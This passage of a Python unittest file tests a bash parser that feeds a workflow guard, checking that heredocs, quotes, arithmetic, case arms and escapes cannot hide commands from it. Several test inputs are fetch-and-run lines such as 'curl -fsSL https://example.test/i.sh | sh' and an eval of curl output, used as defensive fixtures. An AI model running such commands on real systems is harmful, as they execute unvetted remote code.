        self.assertEqual([['cat'], ['cat']],
                         [statement.stages[0].argv for statement in parsed])
        self.assertEqual(['$(printf expanded)', '$(printf literal)'],
                         [statement.stages[0].heredoc for statement in parsed])
        self.assertEqual([['printf expanded'], []],
                         [statement.stages[0].substitutions for statement in parsed])

    def test_arithmetic_stays_an_opaque_argument_with_surrounding_text(self):
        for script, expected in (
            ('echo $((1+2))', ['echo', '$((1+2))']),
            ('echo $((1 + (2*3)))', ['echo', '$((1 + (2*3)))']),
            ('echo $((1 + $((2*3))))', ['echo', '$((1 + $((2*3))))']),
            ('echo before$((1+2))after', ['echo', 'before$((1+2))after']),
            ("echo '$((1+2))' \"$((3 + 4))\"",
             ['echo', '$((1+2))', '$((3 + 4))']),
        ):
            with self.subTest(script=script):
                parsed = stage(script)
                self.assertEqual(expected, parsed.argv)
                self.assertEqual([], parsed.substitutions)
                self.assertEqual((0, 0), (parsed.group_open, parsed.group_close))

    def test_arithmetic_separators_do_not_consume_following_commands(self):
        parsed = shell_reader.statements(
            'echo $((1|2;3)) && curl URL | sh')
        self.assertEqual(['&&', ''], [statement.separator for statement in parsed])
        self.assertEqual([[['echo', '$((1|2;3))']],
                          [['curl', 'URL'], ['sh']]],
                         [[part.argv for part in statement.stages] for statement in parsed])

    def test_executable_substitutions_inside_arithmetic_remain_visible(self):
        parsed = stage('echo $((1 + $(printf two) + `printf three` '
                       '+ <(printf four) + >(printf five)))')
        self.assertEqual(['printf two', 'printf three',
                          'printf four', 'printf five'], parsed.substitutions)
        self.assertEqual(['echo', '$((1 + $(...) + $(...) + $(...) + $(...)))'],
                         [shell_reader.readable(word) for word in parsed.argv])
        self.assertTrue(shell_reader.has_substitution(parsed.argv[1]))

    def test_deep_arithmetic_keeps_nested_command_and_following_pipeline(self):
        arithmetic = '$((1+' * 1000 + '$(printf two)' + '))' * 1000
        parsed = shell_reader.statements('echo ' + arithmetic + '; curl URL | sh')
        self.assertEqual([';', ''], [statement.separator for statement in parsed])
        self.assertEqual([1, 2], [len(statement.stages) for statement in parsed])
        first = parsed[0].stages[0]
        self.assertEqual('echo', first.argv[0])
        self.assertEqual(2, len(first.argv))
        self.assertEqual(arithmetic.replace('$(printf two)', '$(...)'),
                         shell_reader.readable(first.argv[1]))
        self.assertEqual(['printf two'], first.substitutions)
        self.assertEqual((0, 0), (first.group_open, first.group_close))
        self.assertEqual([['curl', 'URL'], ['sh']],
                         [stage.argv for stage in parsed[1].stages])

    def test_doas_and_leading_keywords_resolve_the_actual_command(self):
        for source in ('doas -u root curl URL', 'if doas -u root curl URL',
                       'then nohup curl URL', 'do stdbuf -o L curl URL'):
            with self.subTest(source=source):
                self.assertEqual(['curl', 'URL'], shell_reader.command(stage(source).argv))


def argvs(script):
    """Each statement of `script`, as its stages' argv lists."""
    return [[part.argv for part in statement.stages]
            for statement in shell_reader.statements(script)]


class TestOneLexicalPass(LinearGrowth, unittest.TestCase):
    """#1793 (COD-3418139920): comments, continuations and heredocs, read the
    way bash reads them -- in one forward pass that knows the quote it is in.

    `statements()` settled all three in line-oriented passes that ran BEFORE
    any quote tracking: a `#` line inside a multi-line string was dropped, a
    `<<WORD` inside quotes, a comment or a `<<<` swallowed the lines down to
    `WORD`, and a backslash ending a comment or a quoted heredoc line joined
    the next line into it. `tests/test_workflow_guard.py` holds the steps each
    one hid from the guard; this is the reader's own half of the spec.
    """

    def test_quote_state_carries_across_lines(self):
        for script in ('echo "a\n# b"; echo c\n', "echo 'a\n# b'; echo c\n"):
            with self.subTest(script=script):
                self.assertEqual([[['echo', 'a\n# b']], [['echo', 'c']]],
                                 argvs(script))
        # `$'...'` spans lines too. shlex has no ANSI-C grammar, so only the
        # statement boundary is this module's to promise.
        parsed = argvs("echo $'a\n# b'; echo c\n")
        self.assertEqual(2, len(parsed), parsed)
        self.assertEqual([['echo', 'c']], parsed[1])

    def test_a_comment_starts_where_a_word_could_and_ends_at_the_newline(self):
        # After a separator it is a comment; inside a word, `${#x}` and `$#`
        # it is text; and a backslash ending one continues nothing.
        self.assertEqual([[['echo', 'a']], [['echo', 'b']]],
                         argvs("echo a;# c\necho b\n"))
        self.assertEqual([[['echo', 'a#b', '${#x}', '$#']]],
                         argvs("echo a#b ${#x} $#\n"))
        self.assertEqual([[['echo', 'a']], [['echo', 'b']]],
                         argvs("echo a # c \\\necho b\n"))
        # A form feed is no blank to bash, and `${...}` holds no comment.
        for script in ("echo a\x0c#b; echo c\n", "echo ${x:-a #b}; echo c\n"):
            with self.subTest(script=script):
                self.assertEqual([['echo', 'c']], argvs(script)[-1])

    def test_a_continuation_folds_where_bash_folds_it(self):
        # Unquoted, even mid-word, and inside "...": the pair is gone.
        self.assertEqual([[['curl', 'URL']]], argvs("cu\\\nrl URL\n"))
        self.assertEqual([[['echo', 'ab']]], argvs('echo "a\\\nb"\n'))
        # Inside '...' it is two characters of the string.
        self.assertEqual([[['echo', 'a\\\nb']]], argvs("echo 'a\\\nb'\n"))
        # A quoted heredoc body is read verbatim, so its terminator survives;
        # an unquoted one is folded first, as bash folds it.
        quoted = shell_reader.statements("cat <<'EOF'\nx \\\nEOF\necho after\n")
        self.assertEqual('x \\', quoted[0].stages[0].heredoc)
        self.assertEqual(['echo', 'after'], quoted[1].stages[0].argv)
        self.assertEqual('x y', stage("cat <<EOF\nx \\\ny\nEOF\n").heredoc)

    def test_queued_heredocs_are_read_in_order_after_the_newline(self):
        parsed = shell_reader.statements(
            "cat <<A; cat <<B\na\nA\nb\nB\necho after\n")
        self.assertEqual(['a', 'b', None], [s.stages[0].heredoc for s in parsed])
        self.assertEqual(['echo', 'after'], parsed[2].stages[0].argv)
        # The body starts after the NEWLINE that ends the command, and a
        # string running over two lines moves that newline down.
        parsed = shell_reader.statements('cat <<EOF; echo "x\ny"\nbody\nEOF\n')
        self.assertEqual('body', parsed[0].stages[0].heredoc)
        self.assertEqual(['echo', 'x\ny'], parsed[1].stages[0].argv)

    def test_a_delimiter_is_its_whole_word_and_a_terminator_its_whole_line(self):
        # The word after quote removal, quoted if any part of it was; a line
        # that IS the word, tabs stripped only for `<<-`; and for an unquoted
        # body the line as folded, so `E\` + `OF` ends it.
        for script, body, expands in (
                ("cat <<EOF-X\nbody\nEOF-X\n", "body", True),
                ('cat <<E"O"F\nbody\nEOF\n', "body", False),
                ("cat <<\\EOF\nbody\nEOF\n", "body", False),
                ("cat <<EOF\n  EOF\nbody\nEOF\n", "  EOF\nbody", True),
                ("cat <<-EOF\n\tbody\n\tEOF\n", "body", True),
                ("cat <<EOF\nE\\\nOF\n", "", True),
                ("cat <<$'\\t'\nbody\n\t\n", "body", False),
                ("cat <<'EOF'\nE\\\nOF\nEOF\n", "E\\\nOF", False)):
            with self.subTest(script=script):
                self.assertEqual((body, expands), stage(script).stdin_heredoc)

    def test_what_bash_does_not_read_as_a_heredoc_swallows_nothing(self):
        # No terminator below it, so the lines below stay code -- the reading
        # that can only report more. A `<<<` here-string, an arithmetic shift
        # and a `<<` inside backquotes (their text is read later, as its own
        # script) are not heredocs at all.
        for script in ("cat <<EOF\necho a\n",
                       "cat <<<EOF\necho a\nEOF\n",
                       "echo $((1<<EOF))\necho a\nEOF\n",
                       "(( x = 1 << EOF ))\necho a\nEOF\n",
                       "echo $[a[1]<<EOF]\necho a\nEOF]\n",
                       "a[1 << EOF]=x\necho a\nEOF]=x\n",
                       "echo `cat <<EOF`\necho a\nEOF\n"):
            with self.subTest(script=script):
                self.assertIn([['echo', 'a']], argvs(script))

    def test_a_delimiter_bash_parses_to_spell_is_refused(self):
        # Bash spells `<<$(a b)` by parsing the word, and the reader parses
        # no expansions: a body ended at a guessed spelling (`$`) swallows
        # what bash runs, and a body read as code hides it behind a quote
        # left open there (#2224). So the reader raises, and names the word
        # as bash delimits it -- up to the metacharacter that ends it, past
        # the brackets and quotes inside it, and past the `\`-newlines before
        # it, which bash folds away first. ANSI-C escapes are decoded exactly.
        for script, word in (("cat <<$(a b)\n$(a b)\necho a\n$\n", "$(a b)"),
                             ("cat <<${x y} >out\n${x y}\n", "${x y}"),
                             ("cat <<$[1]; echo a\n$[1]\n", "$[1]"),
                             ("cat <<@(a b)\n@(a b)\n", "@(a b)"),
                             ('cat <<"$(a b)"\n$(a b)\n', '"$(a b)"'),
                             ("cat <<E$(a b)F\nE$(a b)F\n", "E$(a b)F"),
                             ("cat <<-$(a b)\n\t$(a b)\n", "$(a b)"),
                             ("cat 3<<$(a b)\n$(a b)\n", "$(a b)"),
                             ("x=$(cat <<$(a b))\n", "$(a b)"),
                             ("cat <<\\\n$(x)\nit's\n$(x)\n", "$(x)"),
                             ("cat << \\\n $(x)\nit's\n$(x)\n", "$(x)")):
            with self.subTest(script=script):
                with self.assertRaises(shell_lex.Unreadable) as raised:
                    shell_reader.statements(script)
                self.assertIn("`%s`" % word, str(raised.exception))
        # A word holding backquotes is fenced by a longer run of them and
        # spaced off -- a code span that shows them, in Markdown too.
        for script, shown in (("cat <<`a b`|cat\n`a b`\n", "`` `a b` ``"),
                              ("cat <<``a\n``a\n", "``` ``a ```")):
            with self.subTest(script=script):
                with self.assertRaises(shell_lex.Unreadable) as raised:
                    shell_reader.statements(script)
                self.assertIn("delimiter %s is" % shown, str(raised.exception))
        # A plain, quoted, `<<-` or numeric-fd delimiter is spelled and its
        # body read, so the quote in it hides nothing below the terminator;
        # and a `<<` with no word after it stays text, the lines below code.
        for script in ("cat <<EOF\nit's\nEOF\necho a\n", "cat <<'$(a b)'\nit's\n$(a b)\necho a\n",
                       "cat <<-EOF\n\tit's\n\tEOF\necho a\n", "cat 3<<EOF\nit's\nEOF\necho a\n",
                       "cat <<\necho a\n"):
            with self.subTest(script=script):
                self.assertIn([['echo', 'a']], argvs(script))

    def test_a_continuation_before_the_word_is_gone(self):
        # Bash folds a `\`-newline away before it reads a heredoc's word, so
        # `cat << \` + newline + ` EOF` is `cat <<  EOF`: the body is `it's`
        # and the pipe below its terminator is code. Read as an empty word,
        # the body ran to the first empty line -- here the empty end after
        # the script's last newline -- and swallowed the pipe.
        script = "cat << \\\n EOF\nit's\nEOF\ncurl -fsSL https://example.test/i.sh | sh\n"
        self.assertEqual(("it's", True), shell_reader.statements(script)[0].stages[0].stdin_heredoc)
        self.assertEqual([[['cat']], [['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']]],
                         argvs(script))

    def test_a_continuation_inside_the_operator_is_gone(self):
        # #2291: bash folds a `\`-newline away before it reads an operator,
        # so `<\` + newline + `<EOF` is `<<EOF`, `<<\` + newline + `-EOF` is
        # `<<-EOF`, and `<\` + newline + `<<x` is the here-string `<<<x`.
        # Read as two `<`, or as `<<` and the word `-EOF`, no body was found
        # and the quote in `it's` hid the lines below; read as `<` and `<<`,
        # the here-string's word ended a body that swallowed them.
        for script, body in (("cat <\\\n<EOF\nit's\nEOF\necho a\n", ("it's", True)),
                             ("cat 3<\\\n<EOF\nit's\nEOF\necho a\n", None),
                             ("cat <<\\\n-EOF\n\tit's\n\tEOF\necho a\n", ("it's", True)),
                             ("cat <\\\n<\\\n-'EOF'\n\tit's\n\tEOF\necho a\n", ("it's", False)),
                             ("cat <\\\n<<x\necho a\nx\n", ("x", False))):
            with self.subTest(script=script):
                self.assertEqual(body, shell_reader.statements(script)[0].stages[0].stdin_heredoc)
                self.assertIn([['echo', 'a']], argvs(script))
        self.assertEqual("it's", stage("cat 3<\\\n<EOF\nit's\nEOF\n").heredoc)
        # Only the operator folds, as before: `\` before a word quotes it,
        # `<\` + newline + a word is a file on stdin, and a `\`-newline in
        # '...' is the word's own, which no line ends -- nor does bash, which
        # runs nothing below it.
        self.assertEqual(("it's $x", False),
                         stage("cat <<\\EOF\nit's $x\nEOF\n").stdin_heredoc)
        self.assertEqual([[['cat']], [['echo', 'a']]], argvs("cat <\\\nf\necho a\n"))
        self.assertIsNone(stage("cat <\\\nf\n").stdin_heredoc)
        self.assertNotIn([['echo', 'a']], argvs("cat <<'E\\\nOF'\nit's\nEOF\necho a\n"))

    def test_every_heredoc_on_a_line_is_filed_under_its_descriptor(self):
        # #2128: a second heredoc on the line was read as `<` of a file named
        # by its delimiter, which replaced descriptor 0 and dropped the body
        # `bash -s` runs. In either order, stdin is the fd-0 body -- and so is
        # the body `heredoc` quotes back to a checksum or a `cat > file`.
        for script in ("bash -s <<'A' 3<<'B'\nscript\nA\ndata\nB\n",
                       "bash -s 3<<'B' <<'A'\ndata\nB\nscript\nA\n"):
            with self.subTest(script=script):
                parsed = stage(script)
                self.assertEqual(['bash', '-s'], parsed.argv)
                self.assertEqual(("script", False), parsed.stdin_heredoc)
                self.assertEqual("script", parsed.heredoc)

    def test_hostile_heredoc_shapes_read_in_linear_time(self):
        # The old heredoc pass searched every line below each `<<` for its
        # terminator, so N unterminated operators were N scans to the end of
        # the script. Terminators are now looked up in an index built once --
        # including for a body that starts in the middle of a folded line,
        # after a comment ending in a backslash. Growth, not speed: a 2.0 s
        # bound on 12000 operators failed on CI's 3.11-3.13 jobs (3.07 s and
        # 3.34 s, against 0.5 s on a dev box), so each shape is read at 1500
        # and 6000 operators. This reader grows about 4x. The old pass grows
        # about 13x: the three blank lines after each operator lengthen every
        # scan it made, and cost this reader little.
        for line in ("x <<D%d\n\n\n\n", "x <<D%d # \\\n"):
            with self.subTest(line=line):
                self.assert_linear_growth(
                    1500, lambda size: "".join(line % k for k in range(size)),
                    lambda size, parsed: self.assertEqual(size, len(parsed)))

    def test_a_subscript_opens_only_where_bash_reads_an_assignment(self):
        # Among `echo`'s arguments `<` ends the word `a[1` and `<<X]` is a
        # heredoc. At a command's head, after a leading redirection (bash
        # 5.2) and inside `name=(...)`, `a[...]` is arithmetic up to its `]`,
        # lines below included, and the lines after that are code.
        parsed = stage("echo a[1<<X]\nbody\nX]\n")
        self.assertEqual((['echo', 'a[1'], 'body'), (parsed.argv, parsed.heredoc))
        for script in ("a[1\n<<X]=y\necho a\nX]=y\n", "a=(\n[1<<X]=y\n)\necho a\nX]=y\n",
                       ">/dev/null a[1<<X]=y\necho a\nX]=y\n"):
            with self.subTest(script=script):
                self.assertIn([['echo', 'a']], argvs(script))

    def test_nested_double_parens_are_decided_in_bounded_time(self):
        # A command's `((` is decided by reading its first group, and one bash
        # makes two subshells is read again as code -- so `((((` nested is
        # read once more per level. Lines of six-deep subshells, each
        # heredoc's open quote kept out of the code only by a real body, stay
        # inside the cap and read in linear time. Growth, not speed: a 2.0 s
        # bound on 2000 lines failed on CI's 3.11-3.13 jobs (5.94 s, against
        # 0.6-0.7 s on a dev box), so 400 and 1600 lines are read and compared.
        def check(size, parsed):
            self.assertEqual(size, len(parsed))
            self.assertEqual({"it's"}, {s.stages[0].heredoc for s in parsed})

        self.assert_linear_growth(400, lambda size: "".join(
            "((((((: <<E%d) ) ) ) ) )\nit's\nE%d\n" % (k, k) for k in range(size)), check)

    def test_past_the_cap_the_reader_raises_instead_of_guessing(self):
        # One group 3000 `(` deep is 3000 readings of the same text: past
        # eight times the script, `shell_lex.Unreadable`, which the guard
        # reports as that step's refusal. The pin is that it fails closed
        # after bounded work: without the cap nothing raises, and the read
        # took about seven seconds, growing with the square of the depth. It
        # raises in under 0.1 s on a dev box; 10 s is no speed claim, only a
        # guard against a catastrophe on CI's traced, shared runners, where
        # the tests above ran 6-9x slower.
        script = "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF\n"
        start = time.monotonic()
        with self.assertRaises(shell_lex.Unreadable):
            shell_reader.statements(script)
        self.assertLess(time.monotonic() - start, 10.0)

    def test_a_heredoc_its_substitution_closes_over_is_read(self):
        # Bash 5.2 takes the body of a heredoc still pending when its `$(...)`
        # closes from the lines below -- a recovery it warns about, and one
        # 3.2 does not make. The 5.2 reading is the standing rule; a body on
        # the lines inside a substitution still open is read there too.
        script = 'echo "$(cat <<EOF)"\nit\'s\nEOF\necho a\n'
        parsed = shell_reader.statements(script)
        inner = stage(parsed[0].stages[0].substitutions[0])
        self.assertEqual(("it's", True), inner.stdin_heredoc)
        self.assertEqual([['echo', 'a']], [part.argv for part in parsed[1].stages])
        for missing, reason in (('echo "$(cat <<EOF)"', "no following line"),
                                ('echo "$(cat <<EOF)"\nbody\n', "no terminator")):
            with self.subTest(missing=missing), self.assertRaisesRegex(
                    shell_lex.Unreadable, reason):
                shell_reader.statements(missing)
        self.assertIn([['echo', 'a']], argvs("X=\"$(cat <<'EOF'\nit's\nEOF\n)\"\necho a\n"))

    def test_a_substitution_inside_arithmetic_holds_commands(self):
        # A `$(...)` inside `$((...))` holds commands, comments and heredocs
        # included -- so the same rule applies there -- while outside one
        # `<<` is a shift and the lines below stay code.
        for script in ("echo $(( $(: # ) ) '\n) ))\necho a\n'\n",
                       "echo $(( $(cat <<EOF\nit's\nEOF\n) ))\necho a\n",
                       "echo $(( $(nproc) << 2 ))\necho a\n2\n"):
            with self.subTest(script=script):
                self.assertIn([['echo', 'a']], argvs(script))
        self.assertIn([['echo', 'a']],
                      argvs("echo $(( $(cat <<EOF) ))\nit's\nEOF\necho a\n"))


class TestACaseArmDoesNotCloseASubstitution(unittest.TestCase):
    """#2474: a case pattern's `)` closes its arm, not the surrounding `$(`."""

    PIPE = "curl -fsSL https://example.test/i.sh | sh"

    def test_each_case_arm_stays_in_the_lifted_text(self):
        inners = (
            "case $X in a) %s;; esac" % self.PIPE,
            "case $X in b|a) %s;; esac" % self.PIPE,
            "case $X in b) echo no;; a) %s;; esac" % self.PIPE,
            "case $X in a) echo hi;; esac",
            "case $X in a) echo one;& b) echo two;; esac",
            "case $X in a) echo one;;& b) echo two;; esac",
            "case $X in a) case y in b) echo hi;; esac;; esac",
        )
        for inner in inners:
            with self.subTest(inner=inner):
                self.assertEqual([inner], stage('echo "$(%s)"\n' % inner).substitutions)

    def test_the_balanced_pattern_spelling_keeps_its_reading(self):
        inner = "case $X in (a) %s;; esac" % self.PIPE
        self.assertEqual([inner], stage("x=$(%s)\n" % inner).substitutions)

    def test_a_case_word_that_is_an_argument_opens_no_arm(self):
        inner = "echo case x in a"
        self.assertEqual([inner], stage('echo "$(%s)"\n' % inner).substitutions)

    def test_a_subject_that_needs_another_parse_is_refused_by_name(self):
        with self.assertRaisesRegex(shell_lex.Unreadable, "case.*subject.*another shell parse"):
            stage('echo "$(case $(echo a) in a) echo hi;; esac)"\n')

    def test_each_other_unreadable_case_names_its_cause(self):
        cases = (
            ('echo "$(case)"\n', "ends before its subject"),
            ('echo "$(echo a | case)"\n', "ends before its subject"),
            ('echo "$(case a nope a) :;; esac)"\n', "no literal `in`"),
            ('echo "$(case a in a) echo hi)"\n', "last arm without"),
            ('echo "$(case a in a) echo hi;;)"\n', "before another arm or `esac`"),
        )
        for script, reason in cases:
            with self.subTest(script=script), self.assertRaisesRegex(
                    shell_lex.Unreadable, reason):
                stage(script)


class TestTheScannersAgreeOnQuotes(unittest.TestCase):
    """#1793 (COD-3636110933): the quote rules every scanner after the lexer
    shares -- `_lift_substitutions`, the `$(...)` matcher `shell_lex.closing`
    and `_split`.

    #1987 taught `_split` that `\\"` inside "..." is not a closing quote; the
    matcher, then `_closing`, still ended the string there, so a nested
    `"a\\")b"` closed its `$(...)` one paren early and the stray `"` hid every
    statement after it.
    `$'it\\'s'` is one word to bash, and an apostrophe inside "..." is text;
    read as quotes, each hid the rest of the script the same way.
    """

    def test_an_escaped_quote_inside_a_substitution_string(self):
        parsed = shell_reader.statements(
            'echo "$(printf \'%s\' "a\\")b")"; echo next\n')
        self.assertEqual(['printf \'%s\' "a\\")b"'], parsed[0].stages[0].substitutions)
        self.assertEqual(['echo', 'next'], parsed[1].stages[0].argv)

    def test_an_ansi_c_string_ends_at_its_unescaped_quote(self):
        for script, inner in (("echo $'it\\'s' \"$(echo sub)\"; echo next\n",
                               "echo sub"),
                              ("x=$(echo $'it\\'s)'); echo next\n",
                               "echo $'it\\'s)'")):
            with self.subTest(script=script):
                parsed = shell_reader.statements(script)
                self.assertEqual([inner], parsed[0].stages[0].substitutions)
                self.assertEqual(['echo', 'next'], parsed[1].stages[0].argv)

    def test_an_apostrophe_inside_double_quotes_is_text(self):
        parsed = stage('echo "it\'s" "$(echo sub)"\n')
        self.assertEqual(['echo sub'], parsed.substitutions)


class TestAssignmentPrefixes(unittest.TestCase):
    """#2348: bash reads each word in front of a command that is a valid
    assignment as one -- `NAME=`, `NAME+=`, `NAME[i]=`, `NAME[i]+=`, and an
    array literal `NAME=(...)` or `NAME+=(...)` -- and runs the command
    behind them. Bash 3.2.57 and GNU bash 5.2.21 both run `tool` in `A+=x sh
    tool` and in `a[1]=x sh tool` (5.2 warns that `a[1]` is not a valid
    identifier there, and runs it anyway). `command` popped only `NAME=`, and
    the reader split an array literal at its parentheses, so the append, the
    element and the literal's first word were read as the command, and the
    one behind them never was.
    """

    def test_every_assignment_form_is_popped(self):
        for prefix in ("X=1", "A+=x", "a[1]=x", "a[1]+=x", "a[i+1]=x", "arr=(a)",
                       "arr=( a )", "arr+=(a b)", "arr=()", "X=1 A+=x a[2]=y arr=(z)"):
            with self.subTest(prefix=prefix):
                self.assertEqual(["sh", "tool"],
                                 shell_reader.command(stage(prefix + " sh tool").argv))

    def test_an_array_literal_is_one_word_of_its_assignment(self):
        parsed = stage("arr=(a b) sh tool")
        self.assertEqual(["arr=(a b)", "sh", "tool"], parsed.argv)
        self.assertEqual((1, 1), (parsed.group_open, parsed.group_close))
        self.assertEqual(["declare", "-a", "arr=(a b)"], stage("declare -a arr=(a b)").argv)
        # A substitution in it is lifted as a command, as anywhere.
        parsed = stage("arr=($(curl u)) sh tool")
        self.assertEqual(["curl u"], parsed.substitutions)
        self.assertEqual(["sh", "tool"], shell_reader.command(parsed.argv))
        # A subshell is not one: nothing assigns in front of its `(`.
        self.assertEqual([["sh", "tool"]], argvs("(sh tool)")[0])

    def test_a_statement_that_only_assigns_reads_its_literal_as_before(self):
        # With no command behind it, the literal's words stay the command, as
        # they always read: an array of a command (`fetch=(curl ...)`) runs
        # where bash expands it (`"${fetch[@]}" URL`), which the guard does
        # not follow, so it reads the command where it is written.
        self.assertEqual(["fetch=", "curl", "--fail", "-L"], stage("fetch=(curl --fail -L)").argv)
        self.assertEqual(["X=1", "arr=", "a"], stage("X=1 arr=(a)").argv)
        self.assertEqual(["curl", "-L"], shell_reader.command(stage("f=(curl -L)").argv))

    def test_behind_a_wrapper_the_words_are_the_wrappers(self):
        # Only a plain `NAME=` is popped there, as `env` and `sudo` take it:
        # `nice a[1]=x sh` runs the word `a[1]=x`, which bash globs there, so
        # it stays the pattern #2294 reports; a literal there is a syntax
        # error bash 3.2.57 and 5.2.21 refuse, and reads as it did.
        self.assertEqual(["sh", "tool"], shell_reader.command(stage("env X=1 sh tool").argv))
        for script in ("sudo a[1]=x sh tool", "nice a[1]+=x sh", "xargs a[1]=x x"):
            with self.subTest(script=script):
                self.assertIn("dynamic command operand",
                              shell_reader.unresolved_wrapper(stage(script).argv) or "")
        self.assertEqual(["sudo", "arr=", "a", "sh", "tool"], stage("sudo arr=(a) sh tool").argv)
        self.assertEqual(["if", "arr=(a)", "sh"], stage("if arr=(a) sh").argv)

    def test_a_word_that_is_no_assignment_is_still_the_command(self):
        # `a[1]x]=y` assigns nothing: bash globs it where a command starts,
        # and the reader reports that pattern as #2294 made it.
        self.assertIn("is a pattern", shell_reader.unresolved_wrapper(
            stage("a[1]x]=y sh tool").argv))
        for script, head in (("1A+=x sh", "1A+=x"), ("A-=x sh", "A-=x"),
                             ("echo A+=x", "echo")):
            with self.subTest(script=script):
                self.assertEqual(head, shell_reader.command(stage(script).argv)[0])


class TestValuesBeforeAShellsProgram(unittest.TestCase):
    """#2344, the reader's two halves: bash decodes `$'...'` before a shell
    sees its options, so `sh $'-c' P` runs `P` (bash 3.2.57 and 5.2.21);
    and each `o` or `O` in an option word takes a value, so in `bash -eo
    pipefail [-]c P` the pattern stands where bash looks for `-c`."""

    def test_ansi_c_quoting_is_the_text_bash_decodes(self):
        self.assertEqual(["sh", "-c", "P"], stage("sh $'-c' P").argv)
        self.assertEqual(["echo", "a'b", 'c"d\\e?'], stage("echo $'a\\'b' $'c\\\"d\\\\e\\?'").argv)
        self.assertEqual(["echo", "x y*", "a"], stage("echo $'x y*' a").argv)
        self.assertFalse(shell_reader.unresolved_wrapper(stage("$'[s]h' -c P").argv))
        self.assertEqual("ab", shell_quote.ansi_c("ab"))
        for escape in ("\\x63", "\\143", "\\u0063", "\\U00000063"):
            with self.subTest(escape=escape):
                self.assertEqual(["sh", "-c", "P"], stage("sh $'-%s' P" % escape).argv)
        escaped = "\\a\\b\\e\\E\\f\\n\\r\\t\\v\\\\\\'\\\"\\?\\cC"
        self.assertEqual("\a\b\x1b\x1b\f\n\r\t\v\\'\"?\x03", shell_quote.ansi_c(escaped))
        self.assertEqual("-c", shell_quote.ansi_c("\\x2dc"))
        self.assertEqual("ab", shell_quote.ansi_c("a\\\nb"))
        self.assertEqual("a", shell_quote.ansi_c("a\\0discarded\\q\\u00e9"))
        self.assertIsNone(shell_quote.ansi_c("\\q"))
        for escape in ("\\200", "\\x80", "\\u00e9", "\\U000000e9"):
            with self.subTest(escape=escape), self.assertRaisesRegex(
                    shell_lex.Unreadable, "outside ASCII"):
                shell_quote.ansi_c(escape)
        # Inside "..." it is no quoting at all.
        self.assertEqual(["echo", "$'-c'"], stage("echo \"$'-c'\"").argv)

    def test_every_o_in_an_option_word_takes_a_value(self):
        for argv in (["bash", "-eo", "pipefail", "[-]c", "P"],
                     ["bash", "-oe", "pipefail", "[-]c", "P"],
                     ["bash", "-euo", "pipefail", "+O", "extglob", "[-]c", "P"]):
            with self.subTest(argv=argv):
                self.assertEqual(argv[1:-1], shell_reader.shell_words(argv))
        self.assertEqual(["-oo", "a", "b", "x.sh"],
                         shell_reader.shell_words(["bash", "-oo", "a", "b", "x.sh", "y"]))
        self.assertEqual(["--norc", "x.sh"], shell_reader.shell_words(["bash", "--norc", "x.sh"]))
        for script in ("bash -eo pipefail [-]c P", "bash -euo pipefail {-c,P}"):
            with self.subTest(script=script):
                self.assertIn("looks for `-c` or a script",
                              shell_reader.unresolved_wrapper(stage(script).argv) or "")


class TestADefaultThatIsAShell(unittest.TestCase):
    """#2337: a command word that is a parameter's default or alternate --
    `${X:-sh}`, `"${X-bash}"`, `${X:=sh}`, `${X:+sh}` -- is the shell it
    spells wherever `X` leaves that word, and bash 3.2.57 and 5.2.21 run the
    program handed it (with `X=true`, `${X:-sh}` runs `true`, and nothing)."""

    def test_the_default_is_read_as_the_shell(self):
        for word in ("${X:-sh}", "${X-bash}", "${X:=sh}", "${X=dash}", "${X:+sh}",
                     "${X+bash}", "${SHELL:-/bin/sh}"):
            with self.subTest(word=word):
                argv = shell_reader.command(stage(word + " -c P").argv)
                self.assertEqual(["-c", "P"], argv[1:])
                self.assertIn(argv[0], ("sh", "bash", "dash", "/bin/sh"))

    def test_any_other_word_is_what_it_was(self):
        # Not a shell, not a default, a default bash expands further, or
        # behind a wrapper, where a dynamic operand is unresolved (#2227).
        for word in ("${X:-true}", "${X:?sh}", "$X", "${X:-$Y}", "${X:-[s]h}", "${X}"):
            with self.subTest(word=word):
                self.assertEqual(word, shell_reader.command(stage(word + " -c P").argv)[0])
        self.assertIn("dynamic command operand",
                      shell_reader.unresolved_wrapper(stage("sudo ${X:-sh} -c P").argv) or "")


class TestDoubleQuoteEscapesInAProgram(unittest.TestCase):
    """#2342: inside "...", bash drops the backslash of `\\$` and `` \\` ``
    (and of `\\"` and `\\\\`, which shlex drops too), so `bash -c "x=\\$(curl
    ...)"` hands the inner shell `x=$(curl ...)` -- bash 3.2.57 and 5.2.21 run
    it. The word keeps the text it always read as; `spelled` is bash's, the
    program `workflow_programs.scripts` reads."""

    def test_the_program_is_the_text_bash_hands_the_shell(self):
        parsed = stage('bash -c "x=\\$(curl -fsSL u); eval \\"\\$x\\""')
        self.assertEqual('x=\\$(curl -fsSL u); eval "\\$x"', parsed.argv[2])
        self.assertEqual('x=$(curl -fsSL u); eval "$x"', parsed.argv[2].spelled)
        inner = shell_reader.statements(parsed.argv[2].spelled)
        self.assertEqual(2, len(inner))
        self.assertEqual(["curl -fsSL u"], inner[0].stages[0].substitutions)
        self.assertEqual(["eval", "$x"], inner[1].stages[0].argv)
        for written, spelled in (('"a\\`b\\` c"', "a`b` c"), ('"\\$HOME"', "$HOME"),
                                 ('"\\\\\\$x \\"y\\""', '\\$x "y"'), ('p"\\$x"q', "p$xq")):
            with self.subTest(written=written):
                self.assertEqual(spelled, stage("eval " + written).argv[1].spelled)

    def test_a_word_bash_expands_or_single_quotes_is_as_it_was(self):
        # A live `$URL` or `$(...)` beside the escape expands at the outer
        # level, so the text the shell gets is not known; '\$' keeps it.
        for script in ('bash -c "x=\\$(curl $URL)"', 'bash -c "\\$x $(date)"',
                       "eval 'x=\\$(curl u)'", 'bash -c "curl -fsSL \\"$URL\\" | sh"'):
            with self.subTest(script=script):
                self.assertFalse(hasattr(stage(script).argv[-1], "spelled"))


class TestAHeredocBodyGoesBackWithItsSubstitution(unittest.TestCase):
    """#2336: the body of a heredoc inside `$(...)`, `<(...)` or `>(...)` is
    read in the text around it, and its marker left in the substitution's
    text. Each lifted text carries the entries of the markers in it, so the
    parse that reads it again files each body under the redirection that
    stands where its marker does."""

    def test_the_stage_reads_the_body_its_redirection_queued(self):
        outer = stage("x=$(bash -s 3<<'B' <<'A'\ndata\nB\nscript\nA\n)\n")
        self.assertEqual(1, len(outer.substitutions), outer.substitutions)
        inner = stage(outer.substitutions[0])
        self.assertEqual((["bash", "-s"], ("script", False), "script"),
                         (inner.argv, inner.stdin_heredoc, inner.heredoc))
        # Two substitutions deep, and in a process substitution.
